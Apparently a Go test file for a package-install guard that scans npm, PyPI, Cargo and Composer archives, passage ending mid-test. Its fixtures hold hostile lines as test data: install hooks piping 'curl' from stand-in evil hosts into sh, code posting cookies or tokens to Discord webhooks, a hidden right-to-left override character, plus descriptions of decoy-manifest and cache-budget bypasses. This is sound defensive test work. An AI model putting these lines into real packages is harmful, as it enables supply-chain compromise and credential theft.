package cli

import (
	"archive/tar"
	"archive/zip"
	"bytes"
	"compress/gzip"
	"context"
	"crypto/sha512"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/chain305/chainsaw-core/intelligence/artifactmap"
)

// makeTGZ builds an in-memory gzip+tar archive from path->contents, mimicking
// the npm/pypi convention of nesting everything under a top-level dir.
func makeTGZ(t *testing.T, files map[string]string) []byte {
	t.Helper()
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gz)
	for name, body := range files {
		if err := tw.WriteHeader(&tar.Header{
			Name: name, Mode: 0o644, Size: int64(len(body)), Typeflag: tar.TypeReg,
		}); err != nil {
			t.Fatalf("tar header %s: %v", name, err)
		}
		if _, err := tw.Write([]byte(body)); err != nil {
			t.Fatalf("tar write %s: %v", name, err)
		}
	}
	if err := tw.Close(); err != nil {
		t.Fatalf("tar close: %v", err)
	}
	if err := gz.Close(); err != nil {
		t.Fatalf("gzip close: %v", err)
	}
	return buf.Bytes()
}

// makeZip builds an in-memory zip archive from path->contents, mimicking a
// Python wheel (.whl is a zip).
func makeZip(t *testing.T, files map[string]string) []byte {
	t.Helper()
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	for name, body := range files {
		w, err := zw.Create(name)
		if err != nil {
			t.Fatalf("zip create %s: %v", name, err)
		}
		if _, err := w.Write([]byte(body)); err != nil {
			t.Fatalf("zip write %s: %v", name, err)
		}
	}
	if err := zw.Close(); err != nil {
		t.Fatalf("zip close: %v", err)
	}
	return buf.Bytes()
}

func TestAnalyzeArtifact_NPMRemoteFetchInstallScript(t *testing.T) {
	tgz := makeTGZ(t, map[string]string{
		"package/package.json": `{"name":"evil","version":"1.0.0","scripts":{"postinstall":"curl https://evil.test/x.sh | sh"}}`,
	})
	v := analyzeArtifact("npm", tgz)
	if !v.Block {
		t.Fatalf("expected BLOCK for remote-fetch postinstall, got %+v", v)
	}
	if v.Severity != "behavioral-high" {
		t.Errorf("severity = %q, want behavioral-high", v.Severity)
	}
	if !strings.Contains(v.Reason, "remote") {
		t.Errorf("reason = %q, want it to mention remote", v.Reason)
	}
}

// TestAnalyzeArtifact_RootDecoyManifestDoesNotMaskNestedMalicious pins the G4
// fix: manifests resolve relative to the archive's single top-level directory —
// the path the package manager actually extracts — not by path depth.
//
// The attack it blocks: an attacker publishes a tarball whose real, malicious
// manifest sits where the package manager reads it (package/package.json) and
// ALSO drops a benign copy at depth 0. npm's `strip:1` extract DISCARDS the
// root-level entry, so it is invisible to npm — but the old shallowest-wins
// resolution made it authoritative for the guard, blinding the entire
// behavioral scan. Verified reproducible: the same malicious manifest blocks
// without the decoy and passed with it.
func TestAnalyzeArtifact_RootDecoyManifestDoesNotMaskNestedMalicious(t *testing.T) {
	const (
		evilPostinstall = `{"name":"evil","version":"1.0.0","scripts":{"postinstall":"curl -s http://evil.example/x.sh | sh"}}`
		benignPkgJSON   = `{"name":"evil","version":"1.0.0","scripts":{"test":"jest"}}`
		evilSetupPy     = "from setuptools import setup\nimport os\ncmdclass = {}\nos.system('curl -s http://evil.example/x.sh | sh')\nsetup(name='evil')\n"
		benignSetupPy   = "from setuptools import setup\nsetup(name='evil', version='1.0.0')\n"
		evilBuildRs     = "fn main() { std::process::Command::new(\"sh\").arg(\"-c\").arg(\"curl https://evil.example/x.sh | sh\").status().unwrap(); }\n"
		benignBuildRs   = "fn main() { println!(\"cargo:rerun-if-changed=src/lib.rs\"); }\n"
		evilComposer    = `{"name":"evil/pkg","scripts":{"post-install-cmd":["curl https://evil.example/x.sh | sh"]}}`
		benignComposer  = `{"name":"evil/pkg","scripts":{"post-install-cmd":["phpunit"]}}`
		cargoToml       = "[package]\nname = \"evil\"\nversion = \"1.0.0\"\nbuild = \"build.rs\"\n"
	)

	cases := []struct {
		name      string
		ecosystem string
		// nested is the archive as the package manager sees it; decoy adds the
		// depth-0 benign copy on top.
		nested map[string]string
		decoy  map[string]string
		root   string // expected packageRoot of the decoy archive
	}{
		{
			name:      "npm_package_json",
			ecosystem: "npm",
			nested:    map[string]string{"package/package.json": evilPostinstall},
			decoy:     map[string]string{"package.json": benignPkgJSON},
			root:      "package",
		},
		{
			name:      "pypi_setup_py",
			ecosystem: "pip",
			nested:    map[string]string{"evil-1.0.0/setup.py": evilSetupPy},
			decoy:     map[string]string{"setup.py": benignSetupPy},
			root:      "evil-1.0.0",
		},
		{
			name:      "cargo_build_rs",
			ecosystem: "cargo",
			nested: map[string]string{
				"evil-1.0.0/Cargo.toml": cargoToml,
				"evil-1.0.0/build.rs":   evilBuildRs,
			},
			decoy: map[string]string{"Cargo.toml": cargoToml, "build.rs": benignBuildRs},
			root:  "evil-1.0.0",
		},
		{
			name:      "composer_json",
			ecosystem: "composer",
			nested:    map[string]string{"evil-pkg-abc1234/composer.json": evilComposer},
			decoy:     map[string]string{"composer.json": benignComposer},
			root:      "evil-pkg-abc1234",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			// Control: the malicious archive alone blocks.
			if v := analyzeArtifact(tc.ecosystem, makeTGZ(t, tc.nested)); !v.Block {
				t.Fatalf("control: malicious archive must block, got %+v", v)
			}
			// The decoy must not change that verdict.
			withDecoy := map[string]string{}
			for k, v := range tc.nested {
				withDecoy[k] = v
			}
			for k, v := range tc.decoy {
				withDecoy[k] = v
			}
			tgz := makeTGZ(t, withDecoy)
			if v := analyzeArtifact(tc.ecosystem, tgz); !v.Block {
				t.Fatalf("root-level decoy manifest masked the nested malicious one — got %+v", v)
			}
			// And the mechanism: the archive is single-rooted, so a depth-0
			// entry is never eligible.
			files := artifactmap.Build(tgz, artifactmap.Options{}).Files
			if got := packageRoot(files); got != tc.root {
				t.Fatalf("packageRoot = %q, want %q", got, tc.root)
			}
		})
	}
}

// TestAnalyzeArtifact_MultiRootArchiveStillResolvesManifest is the twin of the
// decoy test: archives with NO single top-level directory — a wheel (pkg/ plus
// pkg-1.0.dist-info/) or a flat .gem-shaped tar — must keep resolving their
// manifest via the shallowest-wins fallback. Anchoring to a package root is
// only correct where a package root exists; over-tightening here would silently
// drop behavioral coverage for every wheel.
func TestAnalyzeArtifact_MultiRootArchiveStillResolvesManifest(t *testing.T) {
	const evilSetupPy = "from setuptools import setup\nimport os\ncmdclass = {}\nos.system('curl -s http://evil.example/x.sh | sh')\nsetup(name='evil')\n"

	t.Run("wheel_two_top_level_dirs", func(t *testing.T) {
		// A .whl is a zip with the package dir AND a sibling .dist-info dir.
		whl := makeZip(t, map[string]string{
			"evilwheel/setup.py":                 evilSetupPy,
			"evilwheel/__init__.py":              "x = 1\n",
			"evilwheel-1.0.0.dist-info/METADATA": "Name: evilwheel\nVersion: 1.0.0\n",
			"evilwheel-1.0.0.dist-info/RECORD":   "evilwheel/__init__.py,,\n",
		})
		files := artifactmap.Build(whl, artifactmap.Options{}).Files
		if got := packageRoot(files); got != "" {
			t.Fatalf("packageRoot on a two-root wheel = %q, want \"\" (no single extract root)", got)
		}
		if rootFileBytes(files, "setup.py") == nil {
			t.Fatal("fallback failed to resolve setup.py in a multi-root archive")
		}
		if v := analyzeArtifact("pip", whl); !v.Block {
			t.Fatalf("multi-root wheel with a malicious setup.py must still block, got %+v", v)
		}
	})

	t.Run("flat_archive_depth_zero_manifest", func(t *testing.T) {
		// A .gem-shaped archive keeps everything at depth 0 — there is no root
		// to anchor to and the depth-0 manifest is the real one.
		tgz := makeTGZ(t, map[string]string{"setup.py": evilSetupPy})
		files := artifactmap.Build(tgz, artifactmap.Options{}).Files
		if got := packageRoot(files); got != "" {
			t.Fatalf("packageRoot on a flat archive = %q, want \"\"", got)
		}
		if v := analyzeArtifact("pip", tgz); !v.Block {
			t.Fatalf("flat archive with a malicious depth-0 setup.py must block, got %+v", v)
		}
	})

	t.Run("flat_archive_with_one_incidental_dir", func(t *testing.T) {
		// The shape that makes "exclude every depth-0 entry" wrong: a flat
		// composer package whose only directory is src/. The manifest lives at
		// depth 0 and must still resolve.
		tgz := makeTGZ(t, map[string]string{
			"composer.json": `{"name":"evil/pkg","scripts":{"post-install-cmd":["curl https://evil.example/x.sh | sh"]}}`,
			"src/Foo.php":   "<?php class Foo {}\n",
		})
		if v := analyzeArtifact("composer", tgz); !v.Block {
			t.Fatalf("flat composer package with a src/ dir must still block, got %+v", v)
		}
	})
}

func TestAnalyzeArtifact_NPMClean(t *testing.T) {
	tgz := makeTGZ(t, map[string]string{
		"package/package.json": `{"name":"fine","version":"1.0.0","scripts":{"test":"jest"}}`,
		"package/index.js":     "module.exports = 1;\n",
	})
	if v := analyzeArtifact("npm", tgz); v.Block {
		t.Fatalf("clean package must not block, got %+v", v)
	}
}

func TestAnalyzeArtifact_NPMReferencedDependencyMutationWarns(t *testing.T) {
	tgz := makeTGZ(t, map[string]string{
		"package/package.json": `{"name":"html-to-gutenberg","version":"4.2.10","scripts":{"postinstall":"node ./scripts/patch-fetch-page-assets.mjs"}}`,
		"package/scripts/patch-fetch-page-assets.mjs": `
import fs from "fs";
import path from "path";

const projectRoot = process.cwd();
const sourcePath = path.join(projectRoot, "vendor", "fetch-page-assets", "index.js");
const targetPath = path.join(projectRoot, "node_modules", "fetch-page-assets", "index.js");
fs.copyFileSync(sourcePath, targetPath);
`,
	})
	v := analyzeArtifact("npm", tgz)
	if v.Block {
		t.Fatalf("dependency mutation should warn, not block: %+v", v)
	}
	if v.Severity != "behavioral-medium" {
		t.Fatalf("severity = %q, want behavioral-medium (verdict=%+v)", v.Severity, v)
	}
	if !strings.Contains(v.Reason, "node_modules") {
		t.Fatalf("reason = %q, want node_modules context", v.Reason)
	}
}

func TestAnalyzeArtifact_NPMInlineDependencyMutationWarns(t *testing.T) {
	tgz := makeTGZ(t, map[string]string{
		"package/package.json": `{"name":"patchy","version":"1.0.0","scripts":{"postinstall":"mv ./node_modules/fetch-page-assets/index.ts ./node_modules/fetch-page-assets/index.ts.bak || true"}}`,
	})
	v := analyzeArtifact("npm", tgz)
	if v.Block {
		t.Fatalf("inline dependency mutation should warn, not block: %+v", v)
	}
	if v.Severity != "behavioral-medium" {
		t.Fatalf("severity = %q, want behavioral-medium (verdict=%+v)", v.Severity, v)
	}
}

func TestAnalyzeArtifact_HiddenUnicode(t *testing.T) {
	// U+202E RIGHT-TO-LEFT OVERRIDE embedded in JS source — a Trojan-source style payload.
	tgz := makeTGZ(t, map[string]string{
		"package/package.json": `{"name":"sneaky","version":"1.0.0"}`,
		"package/index.js":     "const ok = true;‮ // flip\n",
	})
	v := analyzeArtifact("npm", tgz)
	if !v.Block {
		t.Fatalf("expected BLOCK for hidden-unicode payload, got %+v", v)
	}
	if !strings.Contains(v.Reason, "hidden-unicode") {
		t.Errorf("reason = %q, want it to mention hidden-unicode", v.Reason)
	}
}

func TestAnalyzeArtifact_GarbageFailsOpen(t *testing.T) {
	for _, in := range [][]byte{nil, {}, []byte("not an archive at all"), {0x1f, 0x8b, 0x00}} {
		if v := analyzeArtifact("npm", in); v.Block {
			t.Fatalf("garbage input must not block (got %+v) — fail-open invariant", v)
		}
	}
}

func TestLocalArtifactBytes(t *testing.T) {
	dir := t.TempDir()
	if err := os.MkdirAll(filepath.Join(dir, "npm"), 0o755); err != nil {
		t.Fatal(err)
	}
	want := []byte("tarball-bytes")
	if err := os.WriteFile(filepath.Join(dir, "npm", "evil-1.0.0.tgz"), want, 0o644); err != nil {
		t.Fatal(err)
	}

	// Unset env -> nil (fail-open, behavioral analysis off).
	t.Setenv(guardArtifactDirEnv, "")
	if b, _ := localArtifactBytes(packageSpec{Ecosystem: "npm", Name: "evil", Version: "1.0.0"}); b != nil {
		t.Fatalf("unset dir must return nil, got %d bytes", len(b))
	}

	t.Setenv(guardArtifactDirEnv, dir)
	if b, _ := localArtifactBytes(packageSpec{Ecosystem: "npm", Name: "evil", Version: "1.0.0"}); !bytes.Equal(b, want) {
		t.Fatalf("pinned lookup = %q, want %q", b, want)
	}
	// Missing package -> nil.
	if b, _ := localArtifactBytes(packageSpec{Ecosystem: "npm", Name: "absent", Version: "9.9.9"}); b != nil {
		t.Fatalf("missing artifact must return nil, got %d bytes", len(b))
	}
}

// TestLocalArtifactBytes_EcosystemAliases pins that a staged artifact resolves
// even when the operator uses the registry directory name (pypi, gem, crates)
// instead of the guard's ecosystem verb (pip, rubygems, cargo). Without the
// alias the byte scan silently no-ops — the footgun this guards against.
func TestLocalArtifactBytes_EcosystemAliases(t *testing.T) {
	want := []byte("staged")
	cases := []struct {
		eco, dirName string // spec ecosystem (guard verb) vs the subdir the operator used
	}{
		{"pip", "pypi"},
		{"rubygems", "gem"},
		{"cargo", "crates"},
		{"go", "gomod"},
	}
	for _, tc := range cases {
		t.Run(tc.eco+"_staged_as_"+tc.dirName, func(t *testing.T) {
			dir := t.TempDir()
			if err := os.MkdirAll(filepath.Join(dir, tc.dirName), 0o755); err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(filepath.Join(dir, tc.dirName, "evil-1.0.0.tgz"), want, 0o644); err != nil {
				t.Fatal(err)
			}
			t.Setenv(guardArtifactDirEnv, dir)
			if b, _ := localArtifactBytes(packageSpec{Ecosystem: tc.eco, Name: "evil", Version: "1.0.0"}); !bytes.Equal(b, want) {
				t.Fatalf("eco %q staged under %q/ = %q, want %q (alias lookup failed)", tc.eco, tc.dirName, b, want)
			}
		})
	}
}

func TestAnalyzeArtifact_CargoBuildRsRemoteFetch(t *testing.T) {
	// A .crate nests files under <name>-<version>/. A build.rs that shells out
	// to curl is the rustdecimal-class attack — Aikido's feed is near-empty here.
	crate := makeTGZ(t, map[string]string{
		"evil-1.0.0/Cargo.toml": "[package]\nname = \"evil\"\nversion = \"1.0.0\"\nbuild = \"build.rs\"\n",
		"evil-1.0.0/build.rs":   "fn main() { std::process::Command::new(\"sh\").arg(\"-c\").arg(\"curl https://evil.test/x.sh | sh\").status().unwrap(); }\n",
	})
	v := analyzeArtifact("cargo", crate)
	if !v.Block {
		t.Fatalf("expected BLOCK for build.rs that fetches remote code, got %+v", v)
	}
	if v.Severity != "behavioral-high" {
		t.Errorf("severity = %q, want behavioral-high", v.Severity)
	}
}

func TestAnalyzeArtifact_ComposerRemoteFetchInstallScript(t *testing.T) {
	// A composer.json whose post-install-cmd shells out to curl is the
	// PHP/Composer flavour of the remote-fetch install-script attack.
	tgz := makeTGZ(t, map[string]string{
		"composer.json": `{"name":"evil/pkg","scripts":{"post-install-cmd":["curl https://evil.test/x.sh | sh"]}}`,
	})
	v := analyzeArtifact("composer", tgz)
	if !v.Block {
		t.Fatalf("expected BLOCK for composer post-install-cmd that fetches remote code, got %+v", v)
	}
	if v.Severity != "behavioral-high" {
		t.Errorf("severity = %q, want behavioral-high", v.Severity)
	}
	if !strings.Contains(v.Reason, "remote") {
		t.Errorf("reason = %q, want it to mention remote", v.Reason)
	}
	// The "php" alias resolves to the same detector.
	if v := analyzeArtifact("php", tgz); !v.Block {
		t.Errorf("php alias must block the same composer payload, got %+v", v)
	}
}

func TestAnalyzeArtifact_ComposerClean(t *testing.T) {
	tgz := makeTGZ(t, map[string]string{
		"composer.json": `{"name":"fine/pkg","scripts":{"post-install-cmd":["phpunit"]}}`,
	})
	if v := analyzeArtifact("composer", tgz); v.Block {
		t.Fatalf("clean composer package must not block, got %+v", v)
	}
}

func TestFetchArtifactBytes_FailsOpenOnServerError(t *testing.T) {
	// Deep mode on, but the registry returns 500: fetchArtifactBytes must yield
	// nil so the install proceeds (fail-open) — a guard that breaks installs on a
	// flaky registry gets uninstalled.
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Error(w, "boom", http.StatusInternalServerError)
	}))
	t.Setenv("CHAINSAW_CONFIG_HOME", t.TempDir()) // isolate the egress-audit write
	t.Setenv(guardDeepFetchEnv, "1")
	t.Setenv(guardNpmRegistryEnv, srv.URL)
	spec := packageSpec{Ecosystem: "npm", Name: "net-evil", Version: "4.0.0"}
	if b, _ := fetchArtifactBytes(spec); b != nil {
		srv.Close()
		t.Fatalf("a 500 from the registry must fail open (nil), got %d bytes", len(b))
	}

	// And a dead server (connection refused) must also fail open, not error out.
	srv.Close()
	if b, _ := fetchArtifactBytes(spec); b != nil {
		t.Fatalf("a closed/unreachable server must fail open (nil), got %d bytes", len(b))
	}
}

func TestAnalyzeArtifact_CargoClean(t *testing.T) {
	crate := makeTGZ(t, map[string]string{
		"fine-1.0.0/Cargo.toml": "[package]\nname = \"fine\"\nversion = \"1.0.0\"\n",
		"fine-1.0.0/src/lib.rs": "pub fn ok() -> bool { true }\n",
	})
	if v := analyzeArtifact("cargo", crate); v.Block {
		t.Fatalf("clean crate must not block, got %+v", v)
	}
}

// writeNpmCache stages a tarball into a fake npm cacache the way npm would,
// returning the cache root to point npm_config_cache at.
func writeNpmCache(t *testing.T, name, version string, tarball []byte) string {
	t.Helper()
	root := t.TempDir()
	cacache := filepath.Join(root, "_cacache")
	// Content-addressed store: content-v2/sha512/<2>/<2>/<rest>.
	sum := sha512.Sum512(tarball)
	h := hex.EncodeToString(sum[:])
	contentDir := filepath.Join(cacache, "content-v2", "sha512", h[0:2], h[2:4])
	if err := os.MkdirAll(contentDir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(contentDir, h[4:]), tarball, 0o644); err != nil {
		t.Fatal(err)
	}
	// Index entry: "<digest>\t<json>" with the tarball-URL key + integrity.
	integrity := "sha512-" + base64.StdEncoding.EncodeToString(sum[:])
	key := fmt.Sprintf("make-fetch-happen:request-cache:https://registry.npmjs.org/%s/-/%s-%s.tgz", name, name, version)
	idxDir := filepath.Join(cacache, "index-v5", "aa", "bb")
	if err := os.MkdirAll(idxDir, 0o755); err != nil {
		t.Fatal(err)
	}
	line := fmt.Sprintf("deadbeef\t{\"key\":%q,\"integrity\":%q}\n", key, integrity)
	if err := os.WriteFile(filepath.Join(idxDir, "entry"), []byte(line), 0o644); err != nil {
		t.Fatal(err)
	}
	return root
}

func TestNpmCacheArtifactBytes(t *testing.T) {
	tgz := makeTGZ(t, map[string]string{
		"package/package.json": `{"name":"cached-evil","version":"3.0.0","scripts":{"postinstall":"curl https://evil.test/x | sh"}}`,
	})
	root := writeNpmCache(t, "cached-evil", "3.0.0", tgz)
	t.Setenv("npm_config_cache", root)
	t.Setenv(guardArtifactDirEnv, "") // force the cache path, not the staged dir

	got, _ := npmCacheArtifactBytes(packageSpec{Ecosystem: "npm", Name: "cached-evil", Version: "3.0.0"})
	if !bytes.Equal(got, tgz) {
		t.Fatalf("npm cache read returned %d bytes, want the staged %d", len(got), len(tgz))
	}
	// Unpinned or missing -> nil (fail-open).
	if b, _ := npmCacheArtifactBytes(packageSpec{Ecosystem: "npm", Name: "cached-evil"}); b != nil {
		t.Errorf("unpinned spec must not resolve from cache, got %d bytes", len(b))
	}
	// And the guard blocks it end-to-end via the cache, no staging dir.
	g := newLocalGuard()
	v := g.evaluate(context.Background(), packageSpec{Ecosystem: "npm", Name: "cached-evil", Version: "3.0.0"})
	if !v.Block {
		t.Fatalf("guard must block a cached malicious package with no staging dir, got %+v", v)
	}
}

func TestCargoCacheArtifactBytes(t *testing.T) {
	crate := makeTGZ(t, map[string]string{
		"cached-crate-2.0.0/Cargo.toml": "[package]\nname = \"cached-crate\"\nversion = \"2.0.0\"\nbuild = \"build.rs\"\n",
		"cached-crate-2.0.0/build.rs":   "fn main() { std::process::Command::new(\"sh\").arg(\"-c\").arg(\"curl https://evil.test/x.sh | sh\").status().unwrap(); }\n",
	})
	home := t.TempDir()
	// Cargo stages the download at registry/cache/<registry-hash>/<name>-<ver>.crate.
	cacheDir := filepath.Join(home, "registry", "cache", "github.com-1ecc6299db9ec823")
	if err := os.MkdirAll(cacheDir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(cacheDir, "cached-crate-2.0.0.crate"), crate, 0o644); err != nil {
		t.Fatal(err)
	}
	t.Setenv("CARGO_HOME", home)
	t.Setenv(guardArtifactDirEnv, "") // force the cache path, not the staged dir

	got, _ := cargoCacheArtifactBytes(packageSpec{Ecosystem: "cargo", Name: "cached-crate", Version: "2.0.0"})
	if !bytes.Equal(got, crate) {
		t.Fatalf("cargo cache read returned %d bytes, want the staged %d", len(got), len(crate))
	}
	// Unpinned -> nil (fail-open).
	if b, _ := cargoCacheArtifactBytes(packageSpec{Ecosystem: "cargo", Name: "cached-crate"}); b != nil {
		t.Errorf("unpinned spec must not resolve from cache, got %d bytes", len(b))
	}
	// Missing crate -> nil.
	if b, _ := cargoCacheArtifactBytes(packageSpec{Ecosystem: "cargo", Name: "absent", Version: "9.9.9"}); b != nil {
		t.Errorf("missing crate must return nil, got %d bytes", len(b))
	}
	// Missing CARGO_HOME dir -> nil (fail-open).
	t.Setenv("CARGO_HOME", filepath.Join(home, "does-not-exist"))
	if b, _ := cargoCacheArtifactBytes(packageSpec{Ecosystem: "cargo", Name: "cached-crate", Version: "2.0.0"}); b != nil {
		t.Errorf("missing cargo cache dir must return nil, got %d bytes", len(b))
	}
	t.Setenv("CARGO_HOME", home)

	// And the guard blocks it end-to-end via the cache, no staging dir.
	g := newLocalGuard()
	v := g.evaluate(context.Background(), packageSpec{Ecosystem: "cargo", Name: "cached-crate", Version: "2.0.0"})
	if !v.Block {
		t.Fatalf("guard must block a cached malicious crate with no staging dir, got %+v", v)
	}
}

func TestPipCacheArtifactBytes(t *testing.T) {
	// A wheel is a zip; analyzeArtifact("pip", …) reads its source bodies. Embed
	// a Discord webhook in a module so the IOC scan blocks (wheels lack setup.py,
	// so the install-script detector never fires — this is the coverage a
	// wheel-cache hit adds).
	whl := makeZip(t, map[string]string{
		"cached_pkg/__init__.py": "import requests\nrequests.post('https://discord.com/api/webhooks/123/abc', data=open('cookies.sqlite','rb').read())\n",
	})
	root := t.TempDir()
	// pip sards wheels under wheels/<a>/<b>/<c>/<hash>/<file>.whl.
	wheelDir := filepath.Join(root, "wheels", "a", "b", "c", "0123456789abcdef")
	if err := os.MkdirAll(wheelDir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(wheelDir, "cached_pkg-1.2.3-py3-none-any.whl"), whl, 0o644); err != nil {
		t.Fatal(err)
	}
	t.Setenv("PIP_CACHE_DIR", root)
	t.Setenv(guardArtifactDirEnv, "") // force the cache path, not the staged dir

	// Name given with a dash resolves via PEP 503 normalization to the underscore
	// wheel filename.
	got, _ := pipCacheArtifactBytes(packageSpec{Ecosystem: "pip", Name: "cached-pkg", Version: "1.2.3"})
	if !bytes.Equal(got, whl) {
		t.Fatalf("pip cache read returned %d bytes, want the staged %d", len(got), len(whl))
	}
	// Unpinned -> nil (fail-open).
	if b, _ := pipCacheArtifactBytes(packageSpec{Ecosystem: "pip", Name: "cached-pkg"}); b != nil {
		t.Errorf("unpinned spec must not resolve from cache, got %d bytes", len(b))
	}
	// Missing wheel -> nil.
	if b, _ := pipCacheArtifactBytes(packageSpec{Ecosystem: "pip", Name: "absent", Version: "9.9.9"}); b != nil {
		t.Errorf("missing wheel must return nil, got %d bytes", len(b))
	}
	// Missing cache dir -> nil (fail-open).
	t.Setenv("PIP_CACHE_DIR", filepath.Join(root, "does-not-exist"))
	if b, _ := pipCacheArtifactBytes(packageSpec{Ecosystem: "pip", Name: "cached-pkg", Version: "1.2.3"}); b != nil {
		t.Errorf("missing pip cache dir must return nil, got %d bytes", len(b))
	}
	t.Setenv("PIP_CACHE_DIR", root)

	// And the guard blocks it end-to-end via the cache, no staging dir.
	g := newLocalGuard()
	v := g.evaluate(context.Background(), packageSpec{Ecosystem: "pip", Name: "cached-pkg", Version: "1.2.3"})
	if !v.Block {
		t.Fatalf("guard must block a cached malicious wheel with no staging dir, got %+v", v)
	}
}

// TestGuardCacheWalkBudgetIsProcessWide pins the G8 fix: the cacache fallback
// walk's file/time allowance is shared across every spec in one invocation, not
// re-allocated per call. Before the fix each spec got its own 4096-file /
// 250ms budget, so a 200-package `npm ci` against a large cacache spent 30.36s
// walking (vs 1.37s with no cache present).
//
// It also pins the accepted TRADEOFF: once the shared budget is spent, later
// specs get no cache bytes and therefore no behavioral scan — fail-open, the
// same as a cache miss.
func TestGuardCacheWalkBudgetIsProcessWide(t *testing.T) {
	// A synthetic cacache whose index shards are numerous enough that a single
	// walk exhausts the file allowance. Entries are keyed on a NON-default
	// registry so the O(1) shard lookup can never resolve them — only the
	// fallback walk can, which is the path under test.
	root := t.TempDir()
	indexDir := filepath.Join(root, "_cacache", "index-v5")
	const shards = 48
	const perShard = 120 // 5,760 index files > guardCacheWalkMaxFiles
	for i := 0; i < shards; i++ {
		d := filepath.Join(indexDir, fmt.Sprintf("%02x", i), "ab")
		if err := os.MkdirAll(d, 0o755); err != nil {
			t.Fatal(err)
		}
		for j := 0; j < perShard; j++ {
			key := fmt.Sprintf("make-fetch-happen:request-cache:http://registry.internal:4873/filler%d-%d/-/filler%d-%d-1.0.0.tgz", i, j, i, j)
			line := fmt.Sprintf("deadbeef\t{\"key\":%q,\"integrity\":\"sha512-nope\"}\n", key)
			if err := os.WriteFile(filepath.Join(d, fmt.Sprintf("e%d", j)), []byte(line), 0o644); err != nil {
				t.Fatal(err)
			}
		}
	}
	t.Setenv("npm_config_cache", root)
	t.Setenv(guardArtifactDirEnv, "")

	guardCacheWalk.reset()
	t.Cleanup(guardCacheWalk.reset)

	const specs = 40
	for i := 0; i < specs; i++ {
		// Every one of these misses the O(1) lookup and falls through to the
		// walk — the exact shape of a fresh `npm ci` against a private registry.
		_, _ = npmCacheArtifactBytes(packageSpec{
			Ecosystem: "npm",
			Name:      fmt.Sprintf("absent-pkg-%d", i),
			Version:   "1.0.0",
		})
	}

	if got := guardCacheWalk.files(); got > guardCacheWalkMaxFiles {
		t.Fatalf("%d specs read %d index files; the shared cap is %d — the budget is still per-call",
			specs, got, guardCacheWalkMaxFiles)
	}
	if !guardCacheWalk.exhausted() {
		t.Fatalf("expected the shared budget to be exhausted after %d walks over %d files (read %d)",
			specs, shards*perShard, guardCacheWalk.files())
	}
	// The tradeoff, asserted rather than assumed: with the budget spent, a
	// later walk returns no integrity. It must ALSO report acquireIncomplete,
	// not acquireMiss — the entry is in the index and the walk never reached
	// it, so "not found" is unproven. This is the distinction that stops a
	// budget-exhaustion bypass from buying the same silence as an uncached
	// package; see acquireResult in guard_artifact.go.
	got, res := findNpmCacheIntegrity(indexDir, "/-/filler0-0-1.0.0.tgz")
	if got != "" {
		t.Fatalf("exhausted budget must yield no integrity, got %q", got)
	}
	if res != acquireIncomplete {
		t.Fatalf("exhausted budget must report acquireIncomplete, got %v — a truncated walk is not a miss", res)
	}
	// A fresh invocation (new process, or an explicit reset) walks again, and
	// a real hit reports acquireOK.
	guardCacheWalk.reset()
	got, res = findNpmCacheIntegrity(indexDir, "/-/filler0-0-1.0.0.tgz")
	if got != "sha512-nope" {
		t.Fatalf("a fresh budget must find the entry, got %q", got)
	}
	if res != acquireOK {
		t.Fatalf("a found entry must report acquireOK, got %v", res)
	}
}

// TestAcquireResult_MissVsIncomplete pins the split that the whole type exists
// for: a package that is simply not cached reports acquireMiss, while the same
// lookup under an exhausted walk budget reports acquireIncomplete. Before the
// split both returned a bare nil and the call site could not tell them apart —
// which made budget exhaustion a silent-ALLOW primitive.
func TestAcquireResult_MissVsIncomplete(t *testing.T) {
	npmCache := t.TempDir()
	t.Setenv("npm_config_cache", npmCache)
	// npmCacacheDir resolves <npm_config_cache>/_cacache, not the bare dir.
	cacache := filepath.Join(npmCache, "_cacache")
	if err := os.MkdirAll(filepath.Join(cacache, "index-v5"), 0o755); err != nil {
		t.Fatal(err)
	}
	guardCacheWalk.reset()
	t.Cleanup(guardCacheWalk.reset)

	spec := packageSpec{Ecosystem: "npm", Name: "not-cached", Version: "1.0.0"}

	// Fresh budget, empty index: a genuine miss.
	if b, res := npmCacheArtifactBytes(spec); len(b) != 0 || res != acquireMiss {
		t.Fatalf("uncached package with a fresh budget: want (nil, acquireMiss), got (%d bytes, %v)", len(b), res)
	}

	// Same lookup, budget spent: the walk cannot prove absence.
	guardCacheWalk.exhaustForTest()
	if b, res := npmCacheArtifactBytes(spec); len(b) != 0 || res != acquireIncomplete {
		t.Fatalf("uncached package with an exhausted budget: want (nil, acquireIncomplete), got (%d bytes, %v)", len(b), res)
	}

	// Wrong ecosystem is always a miss — never attacker-influenceable.
	guardCacheWalk.reset()
	if b, res := cargoCacheArtifactBytes(spec); len(b) != 0 || res != acquireMiss {
		t.Fatalf("npm spec against the cargo source: want (nil, acquireMiss), got (%d bytes, %v)", len(b), res)
	}

	// A corrupt integrity string resolved from the index is incomplete, not a
	// miss: npm has bytes it intends to install and the guard cannot read them.
	if b, res := readCacacheContent(cacache, "sha512-!!!not-base64!!!"); len(b) != 0 || res != acquireIncomplete {
		t.Fatalf("corrupt integrity: want (nil, acquireIncomplete), got (%d bytes, %v)", len(b), res)
	}
}

func TestAnalyzeArtifact_EmbeddedIOCHost(t *testing.T) {
	// A JS source embedding a Discord webhook exfil sink — an in-no-feed IOC the
	// name lookup can never catch. Cross-ecosystem: the IOC scan runs regardless
	// of the manifest.
	tgz := makeTGZ(t, map[string]string{
		"package/package.json": `{"name":"looks-fine","version":"1.0.0"}`,
		"package/index.js":     "fetch('https://discord.com/api/webhooks/999/deadbeef', {method:'POST', body: process.env.TOKEN});\n",
	})
	v := analyzeArtifact("npm", tgz)
	if !v.Block {
		t.Fatalf("expected BLOCK for embedded exfil-webhook IOC, got %+v", v)
	}
	if v.Severity != "behavioral-high" {
		t.Errorf("severity = %q, want behavioral-high", v.Severity)
	}
